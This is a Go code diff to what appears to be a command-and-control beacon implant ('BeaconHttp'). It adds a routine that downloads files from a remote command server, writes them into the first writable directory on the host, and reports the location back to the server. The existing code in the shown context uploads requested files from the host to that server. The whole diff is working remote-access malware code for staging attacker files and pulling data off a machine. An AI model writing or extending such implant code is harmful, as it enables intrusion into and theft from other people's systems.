@@ -60,6 +60,64 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for _, file := range commResp.Download {
 		packet.upload(file)
 	}
+
+	for _, file := range commResp.Upload {
+		packet.download(file)
+	}
+}
+
+func (packet BeaconHttp) download(filePath string) {
+	filename := filePath
+	if filename[0] == '/' || filename[0] == '~' {
+		f := strings.Split(filename, "/")
+		filename = f[len(f)-1]
+	}
+
+	result := "0"
+
+	url := "http://" + cmdAddress + ":" + cmdPort + "/d/" + b64.StdEncoding.EncodeToString([]byte(filePath))
+	req, err := http.NewRequest("GET", url, nil)
+	debugFatal(err)
+	req.Host = "command.com"
+	resp, err := netClient.Do(req)
+	fmt.Println(url)
+	debugFatal(err)
+	defer resp.Body.Close()
+	targetDir := ""
+
+	for _, loc := range writeCheckLocations {
+		out, err := os.Create(loc + "/" + filename)
+		debugFatal(err)
+
+		if err != nil {
+			continue
+		}
+
+		defer out.Close()
+
+		_, err = io.Copy(out, resp.Body)
+		debugFatal(err)
+		
+		if err != nil {
+			continue
+		}
+
+		result = "1"
+		targetDir = loc
+		break
+	}
+
+	result += ";" + targetDir + "/" + filename
+
+	data, err := json.Marshal(CommandUpdate{ip,id,"upload", []byte(result)})
+	debugFatal(err)
+	
+	if err != nil {
+		return
+	}
+
+	encoded := b64.StdEncoding.EncodeToString(data)
+	queryCommandHttp(encoded)
 }
 
 func (packet BeaconHttp) upload(filename string) {
